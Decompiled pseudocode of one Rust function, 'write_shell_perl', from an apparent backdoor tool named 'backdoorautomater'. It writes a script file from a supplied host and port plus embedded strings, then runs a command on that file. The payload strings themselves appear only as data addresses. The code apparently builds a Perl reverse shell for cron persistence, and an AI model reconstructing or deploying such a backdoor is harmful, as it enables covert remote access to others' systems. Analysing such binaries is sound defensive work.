long _ZN17backdoorautomater9cronshell16write_shell_perl17h0bdfc4dbe4ec353dE
               (long param_1,long param_2,long param_3)

{
  long lVar1;
  undefined8 uVar2;
  int local_1ec;
  undefined4 local_1e8;
  undefined4 uStack_1e4;
  undefined4 uStack_1e0;
  undefined4 uStack_1dc;
  undefined8 local_1d8;
  undefined4 local_1c8;
  undefined4 uStack_1c4;
  undefined4 uStack_1c0;
  undefined4 uStack_1bc;
  undefined8 local_1b8;
  undefined4 local_1a8;
  undefined4 uStack_1a4;
  undefined4 uStack_1a0;
  undefined4 uStack_19c;
  undefined8 local_198;
  undefined4 local_168;
  undefined4 uStack_164;
  undefined4 uStack_160;
  undefined4 uStack_15c;
  undefined8 local_158;
  undefined4 local_148;
  undefined4 uStack_144;
  undefined4 uStack_140;
  undefined4 uStack_13c;
  undefined8 local_138;
  undefined8 local_130;
  undefined8 uStack_128;
  undefined4 local_120;
  undefined4 uStack_11c;
  undefined4 uStack_118;
  undefined4 uStack_114;
  undefined local_60 [32];
  undefined8 local_40;
  undefined8 local_38;
  
                    /* try { // try from 00162ed8 to 00162ee7 has its CatchHandler @ 001633b5 */
  _ZN3std2fs4File6create17he97042899d0016f9E(&local_130,param_3);
  lVar1 = uStack_128;
  if ((int)local_130 == 0) {
    local_1ec = local_130._4_4_;
                    /* try { // try from 00162f0a to 00162f72 has its CatchHandler @ 0016339d */
    lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_1ec,&DAT_00267367,0xc);
    if (lVar1 == 0) {
      local_120 = *(undefined4 *)(param_2 + 8);
      uStack_11c = *(undefined4 *)(param_2 + 0xc);
      uStack_118 = *(undefined4 *)(param_2 + 0x10);
      uStack_114 = *(undefined4 *)(param_2 + 0x14);
      local_130 = &DAT_00265aa3;
      uStack_128 = 4;
      _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_1a8,&local_130,2,1,0);
      local_1d8 = local_198;
      local_1e8 = local_1a8;
      uStack_1e4 = uStack_1a4;
      uStack_1e0 = uStack_1a0;
      uStack_1dc = uStack_19c;
                    /* try { // try from 00162f87 to 00163002 has its CatchHandler @ 0016338e */
      _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E
                (&local_1e8,&DAT_00267259,3);
      lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                        (&local_1ec,CONCAT44(uStack_1dc,uStack_1e0),local_1d8);
      if (lVar1 == 0) {
        local_120 = *(undefined4 *)(param_1 + 8);
        uStack_11c = *(undefined4 *)(param_1 + 0xc);
        uStack_118 = *(undefined4 *)(param_1 + 0x10);
        uStack_114 = *(undefined4 *)(param_1 + 0x14);
        local_130 = &DAT_00267373;
        uStack_128 = 3;
        _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_1a8,&local_130,2,1,0);
        local_1b8 = local_198;
        local_1c8 = local_1a8;
        uStack_1c4 = uStack_1a4;
        uStack_1c0 = uStack_1a0;
        uStack_1bc = uStack_19c;
                    /* try { // try from 00163017 to 0016311e has its CatchHandler @ 0016337f */
        _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E
                  (&local_1c8,&DAT_00267365,2);
        lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                          (&local_1ec,CONCAT44(uStack_1bc,uStack_1c0),local_1b8);
        if (((((lVar1 == 0) &&
              (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_1ec,&DAT_00267376,0x35)
              , lVar1 == 0)) &&
             (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_1ec,&DAT_002673ab,0x2e),
             lVar1 == 0)) &&
            ((lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_1ec,&DAT_002673d9,0x13),
             lVar1 == 0 &&
             (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_1ec,&DAT_002673ec,0x14),
             lVar1 == 0)))) &&
           ((lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_1ec,&DAT_00267400,0x14),
            lVar1 == 0 &&
            ((lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_1ec,&DAT_00267414,0x1a),
             lVar1 == 0 &&
             (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_1ec,&DAT_0026742e,3),
             lVar1 == 0)))))) {
          local_120 = *(undefined4 *)(param_3 + 8);
          uStack_11c = *(undefined4 *)(param_3 + 0xc);
          uStack_118 = *(undefined4 *)(param_3 + 0x10);
          uStack_114 = *(undefined4 *)(param_3 + 0x14);
          local_130 = &DAT_0026735b;
          uStack_128 = 10;
                    /* try { // try from 00163197 to 001631b5 has its CatchHandler @ 0016337f */
          _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_1a8,&local_130,2,1,0);
          local_158 = local_198;
          local_168 = local_1a8;
          uStack_164 = uStack_1a4;
          uStack_160 = uStack_1a0;
          uStack_15c = uStack_19c;
                    /* try { // try from 001631d0 to 001631e8 has its CatchHandler @ 00163323 */
          _ZN3std7process7Command3new17hc59b10cf3f1b2adaE(&local_130,&DAT_00267183,2);
                    /* try { // try from 001631ec to 00163258 has its CatchHandler @ 0016335b */
          uVar2 = _ZN3std7process7Command3arg17ha1bca970e684ecbeE(&local_130,&DAT_00267185,2);
          local_198 = local_158;
          local_1a8 = local_168;
          uStack_1a4 = uStack_164;
          uStack_1a0 = uStack_160;
          uStack_19c = uStack_15c;
          uVar2 = _ZN3std7process7Command3arg17hc1c88ee68029addcE(uVar2,&local_1a8);
          (*(code *)PTR__ZN3std7process7Command6output17hf2f7777b705db8a9E_00368e98)
                    (&local_1a8,uVar2);
          _ZN4core6result19Result_LT_T_C_E_GT_6expect17h4dac3b1149b99667E
                    (local_60,&local_1a8,&PTR_s_src_cronshell_rs_0032a980);
                    /* try { // try from 00163259 to 00163280 has its CatchHandler @ 00163349 */
          _ZN4core3ptr42drop_in_place_LT_std__process__Command_GT_17h60da061aa1df0d14E(&local_130);
          (*(code *)PTR__ZN5alloc6string6String15from_utf8_lossy17h7ed9087fa43d10adE_00368300)
                    (&local_1a8,local_40,local_38);
                    /* try { // try from 00163281 to 0016329a has its CatchHandler @ 0016333a */
          uVar2 = _ZN71__LT_alloc__borrow__Cow_LT_B_GT__u20_as_u20_core__ops__deref__Deref_GT_5deref17ha2c16a4b1cc76445E
                            (&local_1a8);
          _ZN52__LT_T_u20_as_u20_alloc__slice__hack__ConvertVec_GT_6to_vec17h4aa1dd8ab670f689E
                    (&local_130,uVar2);
          local_138 = CONCAT44(uStack_11c,local_120);
          local_148 = (int)local_130;
          uStack_144 = local_130._4_4_;
          uStack_140 = (undefined4)uStack_128;
          uStack_13c = uStack_128._4_4_;
                    /* try { // try from 001632bb to 001632d1 has its CatchHandler @ 00163328 */
          _ZN4core3ptr50drop_in_place_LT_alloc__borrow__Cow_LT_str_GT__GT_17hb5385058f177b775E
                    (&local_1a8);
          _ZN17backdoorautomater9sanitizer23sanitize_system_command17hc9c6071c8b9b108cE(&local_148);
                    /* try { // try from 001632d2 to 001632de has its CatchHandler @ 00163349 */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_148);
                    /* try { // try from 001632df to 001632eb has its CatchHandler @ 00163321 */
          _ZN4core3ptr41drop_in_place_LT_std__process__Output_GT_17h78d1e539beaf0e46E(local_60);
                    /* try { // try from 001632ec to 001632f5 has its CatchHandler @ 0016338e */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_1c8);
                    /* try { // try from 001632f6 to 001632ff has its CatchHandler @ 0016339d */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_1e8);
                    /* try { // try from 00163304 to 00163308 has its CatchHandler @ 001633b5 */
          _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hb99078073e1bf56bE(local_1ec);
                    /* try { // try from 00163309 to 00163310 has its CatchHandler @ 001633b0 */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_3);
                    /* try { // try from 00163311 to 00163318 has its CatchHandler @ 001633ab */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_2);
          lVar1 = 0;
          goto LAB_00163154;
        }
                    /* try { // try from 00163127 to 00163130 has its CatchHandler @ 0016338e */
        _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_1c8);
      }
                    /* try { // try from 00163131 to 0016313a has its CatchHandler @ 0016339d */
      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_1e8);
    }
                    /* try { // try from 0016313f to 00163143 has its CatchHandler @ 001633b5 */
    _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hb99078073e1bf56bE(local_1ec);
  }
                    /* try { // try from 00163144 to 0016314b has its CatchHandler @ 001633b0 */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_3);
                    /* try { // try from 0016314c to 00163153 has its CatchHandler @ 001633ab */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_2);
LAB_00163154:
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_1);
  return lVar1;
}